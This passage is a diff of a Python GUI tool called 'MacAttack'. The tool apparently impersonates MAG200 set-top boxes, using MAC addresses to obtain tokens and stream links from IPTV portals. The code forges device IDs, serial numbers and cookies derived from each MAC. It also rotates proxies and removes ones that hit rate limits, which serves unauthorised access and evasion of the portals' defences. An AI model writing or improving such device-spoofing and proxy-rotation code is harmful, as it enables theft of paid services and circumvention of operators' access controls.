                     elif "Connection to server failed" in res.text:
                         # Track error count for the proxy
                         if selected_proxy not in self.proxy_error_counts:
@@ -4017,10 +4094,9 @@ class MacAttack(QMainWindow):
                         logging.debug(f"Raw Response Content:\n{mac}\n{res.text}")
                     # self.error_count += 1
                 if "Max retries exceeded with url" in str(e):
-                    # self.update_error_text_signal.emit(f"Error for Proxy: <b>Proxy Rate Limited</b> {selected_proxy}")
-                    # self.temp_remove_proxy(selected_proxy)  # Temp remove the proxy
+                    # Could be bad internet, overusing the proxy, or the proxy not connecting
                     logging.debug(
-                        f"Error for Proxy: Proxy Rate Limited {selected_proxy}"
+                        f"Error for Proxy: Proxy Possibly Rate Limited {selected_proxy} \n {str(e)}"
                     )
 
     def remove_proxy(self, proxy, proxy_error_counts):
@@ -4039,11 +4115,10 @@ class MacAttack(QMainWindow):
             self.update_error_text_signal.emit(
                 f"Proxy {proxy} removed after exceeding {error_limit} consecutive errors."
             )
-            # raise StopIteration  # This will stop the loop in BigMacAttack
 
     def temp_remove_proxy(self, proxy):
-        ratelimit_timeout = 5
         """Temporarily remove a proxy for ratelimit_timeout seconds, then re-it."""
+        ratelimit_timeout = 60
         # Get the current text in the proxy_textbox
         current_text = self.proxy_textbox.toPlainText()
         # Check if the proxy exists before attempting to remove it
@@ -4138,7 +4213,9 @@ class MacAttack(QMainWindow):
     #            logging.info(f"An error occurred while loading the configuration: {e}")
 
     def GiveUp(self):
+        global portaltype
         self.running = False
+        portaltype = None
         #        if self.restore_custom_macs_checkbox.isChecked():
         # Reload the custom macs, after a delay
         #            QTimer.singleShot(1000, self.restore_custom_macs)
@@ -4349,6 +4426,7 @@ class MacAttack(QMainWindow):
                 current_scroll_position = playlist_view.verticalScrollBar().value()
 
                 if item_type == "category":
+                    logging.debug("category")
                     # Navigate into a category
                     tab_info["navigation_stack"].append(
                         {
@@ -4426,11 +4504,11 @@ class MacAttack(QMainWindow):
         try:
             session = self.session
             url = self.base_url
-            mac_address = self.mac_address
+            mac = self.mac
 
             # Check if token is still valid
             if not self.is_token_valid():
-                self.token = get_token(session, url, mac_address)
+                self.token, self.token_random = get_token(session, url, mac)
                 self.token_timestamp = time.time()
                 if not self.token:
                     QMessageBox.critical(
@@ -4442,18 +4520,18 @@ class MacAttack(QMainWindow):
 
             token = self.token
 
-            serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
+            serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
             sn = serialnumber[0:13]
             device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
-            device_id2 = hashlib.sha256(mac_address.encode()).hexdigest().upper()
-            hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
+            device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
+            hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
             cookies = {
                 "adid": hw_version_2,
                 "debug": "1",
                 "device_id2": device_id2,
                 "device_id": device_id,
                 "hw_version": "1.7-BD-00",
-                "mac": mac_address,
+                "mac": mac,
                 "sn": sn,
                 "stb_lang": "en",
                 "timezone": "America/Los_Angeles",
@@ -4465,7 +4543,34 @@ class MacAttack(QMainWindow):
                 "AppleWebKit/533.3 (KHTML, like Gecko) "
                 "MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                 "Authorization": f"Bearer {token}",
+                "Connection": "keep-alive",
             }
+
+            if self.token_random:
+                session.headers.update(
+                    {
+                        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
+                        "Accept-Encoding": "identity",
+                        "Accept": "*/*",
+                        "Connection": "keep-alive",
+                        "Authorization": f"Bearer {token}",  # token to headers
+                        "X-Random": f"{token_random}",
+                    }
+                )
+
+                session.cookies.update(
+                    {
+                        "adid": hw_version_2,
+                        "debug": "1",
+                        "device_id2": device_id2,
+                        "device_id": device_id,
+                        "hw_version": "1.7-BD-00",
+                        "mac": mac,
+                        "sn": sn,
+                        "stb_lang": "en",
+                        "timezone": "America/Los_Angeles",
+                    }
+                )
 
             series_id = context_data.get("id")
             if not series_id:
@@ -4572,7 +4677,9 @@ class MacAttack(QMainWindow):
 
     def is_token_valid(self):
         # Assuming token is valid for 10 minutes
-        if self.token and (time.time() - self.token_timestamp) < 600:
+        # if self.token and (time.time() - self.token_timestamp) < 600:
+        # Assuming token is valid for 10 seconds
+        if self.token and (time.time() - self.token_timestamp) < 10:
             return True
         return False
 
@@ -4580,6 +4687,9 @@ class MacAttack(QMainWindow):
         category_type = category["category_type"]
         category_id = category.get("category_id") or category.get("genre_id")
         num_threads = 5
+        logging.debug(
+            f"retrieve channels started type: {category_type} id: {category_id}"
+        )
         try:
             # Instead of setting progress directly, emit 0
             self.set_progress(0)
@@ -4599,7 +4709,9 @@ class MacAttack(QMainWindow):
 
             # Check if token is still valid
             if not self.is_token_valid():
-                self.token = get_token(self.session, self.base_url, self.mac_address)
+                self.token, self.token_random = get_token(
+                    self.session, self.base_url, self.mac
+                )
                 self.token_timestamp = time.time()
                 if not self.token:
                     QMessageBox.critical(
@@ -4611,9 +4723,10 @@ class MacAttack(QMainWindow):
 
             self.request_thread = RequestThread(
                 self.base_url,
-                self.mac_address,
+                self.mac,
                 self.session,
                 self.token,
+                self.token_random,
                 category_type,
                 category_id,
                 num_threads=num_threads,
@@ -4651,11 +4764,11 @@ class MacAttack(QMainWindow):
                 try:
                     session = self.session
                     url = self.base_url
-                    mac_address = self.mac_address
+                    mac = self.mac
 
                     # Check if token is still valid
                     if not self.is_token_valid():
-                        self.token = get_token(session, url, mac_address)
+                        self.token, self.token_random = get_token(session, url, mac)
                         self.token_timestamp = time.time()
                         if not self.token:
                             QMessageBox.critical(
@@ -4668,20 +4781,18 @@ class MacAttack(QMainWindow):
                     token = self.token
 
                     cmd_encoded = quote(cmd)
-                    serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
+                    serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
                     sn = serialnumber[0:13]
                     device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
-                    device_id2 = (
-                        hashlib.sha256(mac_address.encode()).hexdigest().upper()
-                    )
-                    hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
+                    device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
+                    hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
                     cookies = {
                         "adid": hw_version_2,
                         "debug": "1",
                         "device_id2": device_id2,
                         "device_id": device_id,
                         "hw_version": "1.7-BD-00",
-                        "mac": mac_address,
+                        "mac": mac,
                         "sn": sn,
                         "stb_lang": "en",
                         "timezone": "America/Los_Angeles",
@@ -4693,8 +4804,9 @@ class MacAttack(QMainWindow):
                         "AppleWebKit/533.3 (KHTML, like Gecko) "
                         "MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                         "Authorization": f"Bearer {token}",
+                        "Connection": "keep-alive",
                     }
-                    create_link_url = f"{url}/{portaltype}?type=itv&action=create_link&cmd={cmd_encoded}&JsHttpRequest=1-xml"
+                    create_link_url = f"{url}/{player_portaltype}?type=itv&action=create_link&cmd={cmd_encoded}&JsHttpRequest=1-xml"
                     logging.debug(f"Create link URL: {create_link_url}")
                     response = session.get(
                         create_link_url,
@@ -4728,11 +4840,11 @@ class MacAttack(QMainWindow):
             try:
                 session = self.session
                 url = self.base_url
-                mac_address = self.mac_address
+                mac = self.mac
 
                 # Check if token is still valid
                 if not self.is_token_valid():
-                    self.token = get_token(session, url, mac_address)
+                    self.token, self.token_random = get_token(session, url, mac)
                     self.token_timestamp = time.time()
                     if not self.token:
                         QMessageBox.critical(
@@ -4745,18 +4857,18 @@ class MacAttack(QMainWindow):
                 token = self.token
 
                 cmd_encoded = quote(cmd)
-                serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
+                serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
                 sn = serialnumber[0:13]
                 device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
-                device_id2 = hashlib.sha256(mac_address.encode()).hexdigest().upper()
-                hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
+                device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
+                hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
                 cookies = {
                     "adid": hw_version_2,
                     "debug": "1",
                     "device_id2": device_id2,
                     "device_id": device_id,
                     "hw_version": "1.7-BD-00",
-                    "mac": mac_address,
+                    "mac": mac,
                     "sn": sn,
                     "stb_lang": "en",
                     "timezone": "America/Los_Angeles",
@@ -4768,6 +4880,7 @@ class MacAttack(QMainWindow):
                     "AppleWebKit/533.3 (KHTML, like Gecko) "
                     "MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                     "Authorization": f"Bearer {token}",
+                    "Connection": "keep-alive",
                 }
                 if item_type == "episode":
                     episode_number = channel.get("episode_number")
@@ -4777,9 +4890,9 @@ class MacAttack(QMainWindow):
                             self, "Error", "Episode number is missing."
                         )
                         return
-                    create_link_url = f"{url}/{portaltype}?type=vod&action=create_link&cmd={cmd_encoded}&series={episode_number}&JsHttpRequest=1-xml"
+                    create_link_url = f"{url}/{player_portaltype}?type=vod&action=create_link&cmd={cmd_encoded}&series={episode_number}&JsHttpRequest=1-xml"
                 else:
-                    create_link_url = f"{url}/{portaltype}?type=vod&action=create_link&cmd={cmd_encoded}&JsHttpRequest=1-xml"
+                    create_link_url = f"{url}/{player_portaltype}?type=vod&action=create_link&cmd={cmd_encoded}&JsHttpRequest=1-xml"
                 logging.debug(f"Create link URL: {create_link_url}")
                 response = session.get(
                     create_link_url,
